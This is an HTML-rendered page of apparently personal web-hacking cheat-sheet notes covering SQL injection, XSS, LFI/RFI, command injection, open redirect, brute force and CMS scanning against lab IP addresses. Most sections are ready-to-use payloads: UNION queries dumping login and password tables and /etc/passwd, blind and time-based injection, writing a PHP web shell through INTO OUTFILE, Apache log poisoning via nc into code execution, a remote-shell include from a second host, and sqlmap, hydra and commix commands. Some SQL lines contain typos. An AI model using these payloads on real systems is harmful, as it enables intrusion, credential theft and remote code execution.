I"ÈL<h1 id="web-hacking">Web hacking</h1>
<h2 id="attack-vectors">Attack vectors</h2>
<ul>
  <li>Parameters</li>
  <li>Search inputs</li>
  <li>Login/athentication inputs</li>
  <li>Fields/register inputs</li>
  <li>Redirects</li>
  <li>GET e POST parameters</li>
  <li>Download</li>
  <li>Upload</li>
</ul>

<h2 id="sql-injection">SQL Injection.</h2>
<p>Use sql commands that are not sanitized do retrieve database informations:
Links:</p>
<ul>
  <li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">Cheat sheet</a></li>
  <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Portswigger</a></li>
  <li><a href="https://www.w3schools.com/Sql/sql_comments.asp">w3schools</a></li>
</ul>

<p>Sql sintax examples(mysql):</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">user</span><span class="p">();</span> <span class="c1">--Show user</span>
<span class="k">create</span> <span class="k">database</span> <span class="n">test</span><span class="p">;</span>  
<span class="n">use</span> <span class="n">test</span><span class="p">;</span>
<span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
<span class="k">create</span> <span class="k">table</span> <span class="n">users</span><span class="p">(</span><span class="n">id</span> <span class="nb">int</span> <span class="k">primary</span> <span class="k">key</span> <span class="n">auto_increment</span><span class="p">,</span><span class="n">login</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span><span class="n">passwords</span> <span class="n">vasrchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
<span class="k">describe</span> <span class="n">users</span><span class="p">;</span>
<span class="k">select</span> <span class="n">id</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">users</span> <span class="k">values</span><span class="p">(</span><span class="s1">'1'</span><span class="p">,</span><span class="s1">'admin'</span><span class="p">,</span><span class="s1">'admin'</span><span class="p">);</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="nv">"1"</span><span class="p">;</span>
<span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="n">login</span><span class="p">,</span><span class="s1">':'</span><span class="p">,</span><span class="n">passwords</span> <span class="k">from</span> <span class="n">users</span><span class="p">)</span> <span class="c1">-- CONCATENATE selects.</span>
<span class="k">select</span> <span class="o">@@</span><span class="n">versions</span> <span class="c1">-- Show database version</span>
<span class="k">select</span> <span class="k">load</span><span class="p">(</span><span class="s1">'/var/www/html/index.html'</span><span class="p">)</span> <span class="c1">-- Load a file.</span>
<span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">-- Sleep 5 sec until return.</span>
<span class="k">select</span> <span class="k">substring</span><span class="p">(</span><span class="nv">"test"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
<span class="n">use</span> <span class="n">mysql</span><span class="p">;</span> <span class="c1">--System database that has informations about users,...</span>
<span class="n">use</span> <span class="n">information_schema</span><span class="p">;</span> <span class="c1">--System database, has informations about created databases, tables, columns.</span>
</code></pre></div></div>
<h3 id="sql-information-schema">SQL Information Schema</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,table_name,4,5 from information_schema.tables'</span> 
<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,table_name,4,5 where table_schema ="dbname"%23'</span> 
<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,column_name,4,5 where table_schema ="dbname" and table_name="dbusers"%23'</span> 
<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,nome,login,senha from dbusers %23'</span> <span class="p">.</span>
<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,concat('</span><span class="n">id</span><span class="o">=</span><span class="s1">',id,'</span><span class="n">Login</span><span class="o">=</span><span class="s1">',login,'</span><span class="n">pass</span><span class="o">=</span><span class="s1">',password)4,5 from mrudbuserssers %23'</span> 
<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,3,4,load_file("/etc/passwd")%23'</span> 
</code></pre></div></div>
<h3 id="bypass-addslashes">Bypass Addslashes</h3>
<p>Send the string in char.</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">adm</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(100,98,114,116,117,114)'</span>
</code></pre></div></div>

<h3 id="sql-injection-error-based">SQL Injection Error based</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">administration</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">test</span><span class="o">=</span><span class="n">sp</span><span class="s1">'union select 1,2,3,4,5 %25'</span> <span class="c1">--Test until find the number of fields</span>
<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">administration</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">test</span><span class="o">=</span><span class="n">sp</span><span class="s1">'union select 1,2,version(),user(),database()'</span> 
</code></pre></div></div>
<h3 id="blind-sql-injection">Blind SQL Injection</h3>
<p>When we dont have error response.</p>

<h3 id="blind-post-sqli">Blind Post SQLi</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">login</span><span class="o">=</span><span class="n">test</span><span class="s1">' and length(database()) = 7 '</span> <span class="c1">-- Will do request until to find the right lenght of database name</span>

<span class="n">login</span><span class="o">=</span><span class="n">test</span><span class="s1">' and ascii(substring(database(),1,1)) = 100 #'</span> <span class="c1">-- Will check character of the name until find all</span>

<span class="n">login</span><span class="o">=</span><span class="n">test</span><span class="s1">' and (select length(group_concat(table_name))) = 35 from information_schema.tables where table_schema="dbtest")#'</span> <span class="c1">-- To discover the name lenght of the tables. Repeat  the same steps to find the names, character by character.</span>
</code></pre></div></div>

<h3 id="time-based-sql-injection">Time based SQL Injection</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">test</span><span class="o">=</span><span class="s1">' or sleep(5)#'</span> <span class="c1">-- If sleep 6 sec is working the command. </span>

<span class="n">test</span><span class="o">=</span><span class="s1">' or if (database() = char(100,98,109,114,116,117,114), sleep(3),0)#'</span> <span class="c1">-- If was right the comparison will sleep.</span>
</code></pre></div></div>

<h3 id="sql-to-rce">SQL TO RCE</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">adm</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">ps</span><span class="o">=</span><span class="s1">'union all select 1,2,3,4,"&lt;?php system($_GET['</span><span class="n">cmd</span><span class="s1">']);?&gt;" INTO OUTFILE "/var/www/html/adm/banners/rce.php" %23'</span> 

<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">adm</span><span class="o">/</span><span class="n">banners</span><span class="o">/</span><span class="n">rce</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">ifconfig</span>
</code></pre></div></div>
<h3 id="sqlmap">SqlMap</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> âcurrent-db 
sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> âdbs 
sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> <span class="nt">-D</span> databasename âtables 
sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> <span class="nt">-D</span> databasename <span class="nt">-T</span> tablename âcolumns 
sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> <span class="nt">-D</span> databasename <span class="nt">-C</span> <span class="s1">'login,pass'</span> âdump 
sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> âcurrent-user 
sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> âusers 
sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php"</span> âforms 
</code></pre></div></div>

<h2 id="xss-cross-site-scripting">XSS Cross Site Scripting</h2>
<p>Links:</p>
<ul>
  <li><a href="https://brutelogic.com.br/blog/">Brutelogic</a></li>
</ul>

<h3 id="reflect">Reflect</h3>

<h3 id="self-xss">Self-XSS</h3>
<p>The script go to the page.</p>

<h3 id="stored-xss">Stored XSS</h3>
<p>When is possible salve a code in the page, so every time that the page is load the script execute. Can steal cookies, passwords, etc.</p>

<h3 id="dom-xss">Dom XSS</h3>

<h3 id="automation">Automation</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 xsstrike <span class="nt">-u</span> <span class="s2">"http://172.16.10.1/turismo/procurar.php?busca="</span> <span class="c"># Test parameters</span>
python3 xsstrike <span class="nt">-u</span> <span class="s2">"http://172.16.10.1/turismo/procurar.php"</span> <span class="c"># Find parameters in page</span>
python3 xsstrike <span class="nt">-u</span> <span class="s2">"http://172.16.10.1/turismo/procurar.php/"</span> âpath <span class="c"># Search by self-xss</span>
</code></pre></div></div>

<h2 id="lfi-local-file-inclusion">LFI Local File Inclusion</h2>
<p>Application receive a parameter that execeute a command direct, without handling the input.</p>
<ul>
  <li>172.16.1.10/administration/info.php?p=/../../../../etc/passwd -&gt; Read</li>
  <li>172.16.1.10/administration/info.php?p=/../../../../etc/passwd%00 -&gt; Null byte bypass.</li>
</ul>

<p>LFI to RCE - Log infection</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.1.10/administration/info.php?p<span class="o">=</span>/../../../../var/log/apache2/access.log <span class="c"># Read a log file. in this case the apche log.</span>

nc <span class="nt">-v</span> 172.16.1.10 80 <span class="nt">-C</span> &lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'p'</span><span class="o">])</span><span class="p">;</span> ?&gt; <span class="c"># Sending data to register in log</span>

172.16.1.10/administration/info.php?p<span class="o">=</span>/../../../../var/log/apache2/access.log&amp;p<span class="o">=</span>whereis nc <span class="c"># Execute the rce in log file.</span>
</code></pre></div></div>
<h2 id="rfi--remote-file-inclusion">RFI  Remote File Inclusion</h2>
<p>Itâs possible to include a remote file in system.</p>
<ul>
  <li>172.16.1.10/administration/link.php?link=https://172.90.0.37:8080/shell&amp;p=id</li>
</ul>

<h2 id="html-injection">HTML Injection</h2>
<p>Itâs possible inject a html in the page.</p>
<ul>
  <li>â172.16.1.10/administration/search.php?ps=<a href="http://172.90.0.37/">&lt;h1&gt;Amazing link hacker&lt;/h1&gt;</a></li>
</ul>

<h2 id="path-traversal--directory-traversal">Path Traversal | Directory Traversal</h2>
<ul>
  <li>172.16.1.10/administration/test.php?banners=/ -&gt; Will list all files inside the directory.</li>
  <li>172.16.1.10/administration/test.php?banners=/../ -&gt; Will back one directory in path.</li>
</ul>

<h2 id="command-injection">Command injection</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>commix <span class="nt">--url</span> http://172.16.1.10/hosting âdata<span class="o">=</span><span class="s2">"site=whoami"</span> : 
</code></pre></div></div>
<h2 id="path-disclosure">Path disclosure</h2>
<p>When we can see the application path.</p>
<ul>
  <li>/var/www/html/adminstration/index.php</li>
</ul>

<h2 id="open-redirect">Open redirect</h2>
<p>Is a redirect that allow to change the destination to our target.</p>
<ul>
  <li>www.test.com/redirect.php?url=http://attacker.com</li>
</ul>

<h2 id="brute-force">Brute force</h2>
<p>Hydra</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-v</span> <span class="nt">-L</span> users.txt <span class="nt">-P</span> pass.txt 172.16.1.10 http-post-form <span class="s2">"/adm/login.php:login=^USER^&amp;PASS=^PASS^&amp;Login:FAIL"</span>
</code></pre></div></div>

<h2 id="source-code-analisys">Source Code analisys</h2>

<h2 id="php-wrappers">PHP wrappers</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://test.com/index.php?page<span class="o">=</span>data://text/plan<span class="p">;</span><span class="nb">base64</span>,hash 

http://test.com/index.php?page<span class="o">=</span>data://text/plan<span class="p">;</span>&lt;?php system<span class="o">(</span><span class="nb">id</span><span class="o">)</span>?&gt;
</code></pre></div></div>
<h2 id="cms">CMS</h2>
<h3 id="wordpress">Wordpress</h3>
<ul>
  <li><a href="http://wpvulndb.com">wpvulndb.com</a>: Vulnetabilities database</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan âurl http://test.com/blog âapi-token token
</code></pre></div></div>

<h3 id="joomla">JOOMLA</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joomscan <span class="nt">-u</span> http://172.100.0.106
</code></pre></div></div>

<h2 id="webdav">Webdav</h2>
<p>Is a set of extensions for the HTTP.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cadaver http://172.16.1.10/webdav/ <span class="c"># Open a connection to execute commands</span>

davtest <span class="nt">-url</span> http://172.16.1.10/webdav/ <span class="c"># Upload files and execute it.</span>
</code></pre></div></div>

<h2 id="xxe">XXE</h2>

<h2 id="ssrf">SSRF</h2>
<h2 id="csrf">CSRF</h2>
<h2 id="template-injection">Template injection</h2>
<h2 id="subdomain-takeover">Subdomain Takeover</h2>
:ET